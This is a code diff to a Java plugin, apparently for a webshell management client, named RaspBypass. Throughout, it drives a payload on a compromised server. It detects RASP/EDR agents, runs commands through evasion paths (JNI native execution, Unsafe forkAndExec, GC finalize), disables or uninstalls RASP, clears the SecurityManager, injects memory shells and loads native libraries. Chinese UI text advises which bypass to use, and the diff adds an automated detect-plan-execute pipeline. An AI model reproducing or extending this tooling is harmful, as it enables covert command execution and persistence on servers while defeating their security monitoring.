+        this.raspResultTextArea.append("\u542f\u52a8\u667a\u80fd RASP/EDR \u8bca\u65ad\u4e0e\u5efa\u8bae\u5f15\u64ce...\n");
+        this.raspResultTextArea.append("\u5206\u6790\u73af\u5883\u53d8\u91cf\u3001\u8fdb\u7a0b\u6307\u7eb9\u53ca\u5df2\u6ce8\u5165\u4ee3\u7406...\n");
         this.raspResultTextArea.append("----------------------------------------\n");
         
         try {
             byte[] result = this.payload.evalFunc("RaspBypassModule", "opsEnvironment", new ReqParameter());
-            String envData = new String(result);
-            this.raspResultTextArea.append("[+] 检测到目标指纹信息:\n" + envData + "\n");
+            String envData = utf8(result);
+            this.raspResultTextArea.append("[+] \u68c0\u6d4b\u5230\u76ee\u6807\u6307\u7eb9\u4fe1\u606f:\n" + envData + "\n");
             
-            this.raspResultTextArea.append("[*] 专家建议:\n");
+            this.raspResultTextArea.append("[*] \u4e13\u5bb6\u5efa\u8bae:\n");
             if (envData.contains("Rasp") || envData.contains("javaagent")) {
-                this.raspResultTextArea.append("  - 发现强安全代理注入 (RASP/APM)。\n");
-                this.raspResultTextArea.append("  - 建议: 优先使用 '2 JNI 原生执行' 或 '1 Unsafe.allocateInstance + forkAndExec' 以规避 ProcessBuilder 钩子。\n");
+                this.raspResultTextArea.append("  - \u53d1\u73b0\u5f3a\u5b89\u5168\u4ee3\u7406\u6ce8\u5165 (RASP/APM)\u3002\n");
+                this.raspResultTextArea.append("  - \u5efa\u8bae: \u4f18\u5148\u4f7f\u7528 '2 JNI \u539f\u751f\u6267\u884c' \u6216 '1 Unsafe.allocateInstance + forkAndExec' \u4ee5\u89c4\u907f ProcessBuilder \u94a9\u5b50\u3002\n");
             } else if (envData.contains("Linux")) {
-                this.raspResultTextArea.append("  - 运行在 Linux 环境。\n");
-                this.raspResultTextArea.append("  - 建议: 可尝试 '4 GC finalize 绕过' 隐蔽执行，或直接加载原生 JNI 库执行。\n");
+                this.raspResultTextArea.append("  - \u8fd0\u884c\u5728 Linux \u73af\u5883\u3002\n");
+                this.raspResultTextArea.append("  - \u5efa\u8bae: \u53ef\u5c1d\u8bd5 '4 GC finalize \u7ed5\u8fc7' \u9690\u853d\u6267\u884c\uff0c\u6216\u76f4\u63a5\u52a0\u8f7d\u539f\u751f JNI \u5e93\u6267\u884c\u3002\n");
             } else {
-                this.raspResultTextArea.append("  - 未发现明显安全限制或 RASP 特征。\n");
-                this.raspResultTextArea.append("  - 建议: 使用 '0 自动探测' 或常规执行即可，若被拦截再改用新线程绕过。\n");
+                this.raspResultTextArea.append("  - \u672a\u53d1\u73b0\u660e\u663e\u5b89\u5168\u9650\u5236\u6216 RASP \u7279\u5f81\u3002\n");
+                this.raspResultTextArea.append("  - \u5efa\u8bae: \u4f7f\u7528 '0 \u81ea\u52a8\u63a2\u6d4b' \u6216\u5e38\u89c4\u6267\u884c\u5373\u53ef\uff0c\u82e5\u88ab\u62e6\u622a\u518d\u6539\u7528\u65b0\u7ebf\u7a0b\u7ed5\u8fc7\u3002\n");
             }
         } catch (Exception e) {
-            this.raspResultTextArea.append("诊断失败: " + e.getMessage() + "\n");
+            this.raspResultTextArea.append("\u8bca\u65ad\u5931\u8d25: " + e.getMessage() + "\n");
         }
     }
 
@@ -614,26 +845,40 @@ public class RaspBypass implements Plugin {
         }
 
         String method = (String) this.bypassMethodCombo.getSelectedItem();
-        int methodIndex = this.bypassMethodCombo.getSelectedIndex();
+        int selectedIndex = this.bypassMethodCombo.getSelectedIndex();
+        boolean forceSingle = this.forceSingleCheckBox != null && this.forceSingleCheckBox.isSelected();
+        final boolean auto = !forceSingle && (this.autoDetectCheckBox.isSelected() || selectedIndex == 0);
+        final int methodIndex = (forceSingle && selectedIndex == 0) ? 1 : selectedIndex;
 
         this.resultTextArea.append("========================================\n");
+        this.resultTextArea.append("mode: " + (auto ? "PIPELINE(Detect>Plan>Exec>Verify)" : "SINGLE") + "\n");
         this.resultTextArea.append("\u65b9\u5f0f: " + method + "\n");
         this.resultTextArea.append("\u547d\u4ee4: " + cmd + "\n");
         this.resultTextArea.append("----------------------------------------\n");
 
-        // Non-Blocking Task Pipeline Implementation
         java.util.concurrent.CompletableFuture.runAsync(() -> {
             try {
                 ReqParameter params = new ReqParameter();
                 params.add("cmd", cmd);
                 params.add("cmdLine", cmd);
                 params.add("methodIndex", String.valueOf(methodIndex));
-                params.add("autoDetect", this.autoDetectCheckBox.isSelected() ? "true" : "false");
+                params.add("autoDetect", auto ? "true" : "false");
+                // Optional: ship embedded native so pipeline can promote JniNative
+                attachNativeLibBytes(params);
 
                 byte[] result = this.payload.evalFunc("RaspBypassModule", "execCommand", params);
-                String strResult = new String(result);
+                String strResult = result == null ? "(null)" : utf8(result);
                 javax.swing.SwingUtilities.invokeLater(() -> {
-                    this.resultTextArea.append(strResult + "\n");
+                    this.resultTextArea.append(strResult);
+                    if (!strResult.endsWith("\n")) {
+                        this.resultTextArea.append("\n");
+                    }
+                    // highlight meta footer if present
+                    applyPipelineMetaToStatus(strResult);
+                    int meta = strResult.lastIndexOf("<!--RASP_META:");
+                    if (meta >= 0) {
+                        this.resultTextArea.append("[client] pipeline meta applied to status bar\n");
+                    }
                 });
             } catch (Exception e) {
                 javax.swing.SwingUtilities.invokeLater(() -> {
@@ -660,12 +905,12 @@ public class RaspBypass implements Plugin {
             params.add("raspType", raspType);
 
             byte[] result = this.payload.evalFunc("RaspBypassModule", "checkRasp", params);
-            String strResult = new String(result);
+            String strResult = utf8(result);
             if ("Incorrect return type".equals(strResult.trim())) {
                 // Compatibility fallback for old payload marshaling logic.
                 this.raspResultTextArea.append("[!] checkRsp method unavailable, payload may need regeneration...\n");
                 byte[] envResult = this.payload.evalFunc("RaspBypassModule", "opsEnvironment", new ReqParameter());
-                this.raspResultTextArea.append(new String(envResult) + "\n");
+                this.raspResultTextArea.append(utf8(envResult) + "\n");
                 this.raspResultTextArea.append("[!] Falling back to env check after checkRsp failed\n");
                 return;
             }
@@ -706,7 +951,7 @@ public class RaspBypass implements Plugin {
             params.add("op", action);
 
             byte[] result = this.payload.evalFunc("RaspBypassModule", "disableRasp", params);
-            String strResult = new String(result);
+            String strResult = utf8(result);
             this.raspResultTextArea.append(strResult + "\n");
         } catch (Exception e) {
             this.raspResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
@@ -726,7 +971,7 @@ public class RaspBypass implements Plugin {
 
         try {
             byte[] result = this.payload.evalFunc("RaspBypassModule", "universalRaspDisable", new ReqParameter());
-            String strResult = new String(result);
+            String strResult = utf8(result);
             this.raspResultTextArea.append(strResult + "\n");
         } catch (Exception e) {
             this.raspResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
@@ -746,7 +991,7 @@ public class RaspBypass implements Plugin {
 
         try {
             byte[] result = this.payload.evalFunc("RaspBypassModule", "uninstallRasp", new ReqParameter());
-            String strResult = new String(result);
+            String strResult = utf8(result);
             this.raspResultTextArea.append(strResult + "\n");
         } catch (Exception e) {
             this.raspResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
@@ -764,7 +1009,16 @@ public class RaspBypass implements Plugin {
         this.raspResultTextArea.append("----------------------------------------\n");
         try {
             byte[] result = this.payload.evalFunc("RaspBypassModule", "opsEnvironment", new ReqParameter());
-            this.raspResultTextArea.append(new String(result) + "\n");
+            String env = utf8(result);
+            this.raspResultTextArea.append(env + "\n");
+            String planLine = "";
+            for (String line : env.split("\n")) {
+                if (line.contains("PLAN") || line.contains("chain=") || line.contains("summary:")) {
+                    planLine = line.trim();
+                    break;
+                }
+            }
+            updateStatusBar(planLine.isEmpty() ? "\u8bca\u65ad\u5b8c\u6210" : planLine);
         } catch (Exception e) {
             this.raspResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
             Log.error(e);
@@ -786,7 +1040,7 @@ public class RaspBypass implements Plugin {
             params.add("action", "clearSecurityManager");
 
             byte[] result = this.payload.evalFunc("RaspBypassModule", "universalRaspDisable", params);
-            String strResult = new String(result);
+            String strResult = utf8(result);
             this.raspResultTextArea.append(strResult + "\n");
         } catch (Exception e) {
             this.raspResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
@@ -818,7 +1072,7 @@ public class RaspBypass implements Plugin {
             params.add("uri", urlPath);
 
             byte[] result = this.payload.evalFunc("RaspBypassModule", "injectMemShell", params);
-            String strResult = new String(result);
+            String strResult = utf8(result);
             this.memShellResultTextArea.append(strResult + "\n");
         } catch (Exception e) {
             this.memShellResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
@@ -844,7 +1098,7 @@ public class RaspBypass implements Plugin {
             params.add("type", shellType);
 
             byte[] result = this.payload.evalFunc("RaspBypassModule", "removeMemShell", params);
-            String strResult = new String(result);
+            String strResult = utf8(result);
             this.memShellResultTextArea.append(strResult + "\n");
         } catch (Exception e) {
             this.memShellResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
@@ -871,9 +1125,12 @@ public class RaspBypass implements Plugin {
             params.add("path", soPath);
             params.add("jniPath", soPath);
             params.add("libraryPath", soPath);
+            if (soPath == null || soPath.trim().isEmpty()) {
+                attachNativeLibBytes(params);
+            }
 
             byte[] result = this.payload.evalFunc("RaspBypassModule", "loadJniLibrary", params);
-            String strResult = new String(result);
+            String strResult = utf8(result);
             this.jniResultTextArea.append(strResult + "\n");
         } catch (Exception e) {
             this.jniResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
@@ -902,7 +1159,7 @@ public class RaspBypass implements Plugin {
             params.add("commandLine", cmd);
 
             byte[] result = this.payload.evalFunc("RaspBypassModule", "execViaJni", params);
-            String strResult = new String(result);
+            String strResult = utf8(result);
             this.jniResultTextArea.append(strResult + "\n");
         } catch (Exception e) {
             this.jniResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
@@ -935,7 +1192,7 @@ public class RaspBypass implements Plugin {
             params.add("destPath", dstPath);
 
             byte[] result = this.payload.evalFunc("RaspBypassModule", "copyBinary", params);
-            String strResult = new String(result);
+            String strResult = utf8(result);
             this.toolsResultTextArea.append(strResult + "\n");
         } catch (Exception e) {
             this.toolsResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
@@ -968,7 +1225,7 @@ public class RaspBypass implements Plugin {
             params.add("destPath", dstPath);
 
             byte[] result = this.payload.evalFunc("RaspBypassModule", "createSymlink", params);
-            String strResult = new String(result);
+            String strResult = utf8(result);
             this.toolsResultTextArea.append(strResult + "\n");
         } catch (Exception e) {
             this.toolsResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
